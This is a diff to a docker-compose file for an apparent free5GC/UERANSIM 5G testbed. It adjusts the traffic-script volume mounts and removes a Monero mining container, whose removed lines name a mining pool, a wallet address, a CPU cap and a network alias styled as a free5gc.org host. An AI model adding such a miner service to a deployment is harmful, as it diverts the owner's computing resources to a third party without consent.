@@ -214,8 +214,8 @@ services:
     volumes:
       - ./config/gnbcfg.yaml:/ueransim/config/gnbcfg.yaml
       - ./config/uecfg.yaml:/ueransim/config/uecfg.yaml
-      - ./config/random-traffic.sh:/ueransim/config/random-traffic.sh
-      - ./config/traffic-iperf.sh:/ueransim/config/traffic-iperf.sh
+      - ./config/random-traffic.sh:/ueransim/random-traffic.sh
+
     cap_add:
       - NET_ADMIN
     devices:
@@ -227,20 +227,6 @@ services:
     depends_on:
       - free5gc-amf
       - free5gc-upf
-
-  monero-miner:
-    container_name: monero
-    image: pmietlicki/monero-miner
-    environment:
-      - POOL_URL=pool.supportxmr.com:5555
-      - POOL_USER=49JMbPcYXCm58R8Ku5NhnDjHbvtP1eMi1HekvNXQxVzpEGL9guRT9xnVPiEnMCXy1gXT1Z3cjbSMcjUeCiPM3dAuV315kdg
-      - MAX_CPU = 25
-    networks:
-      privnet:
-        aliases:
-          - monero.free5gc.org
-    depends_on:
-      - free5gc-upf 
 
 networks:
   privnet:
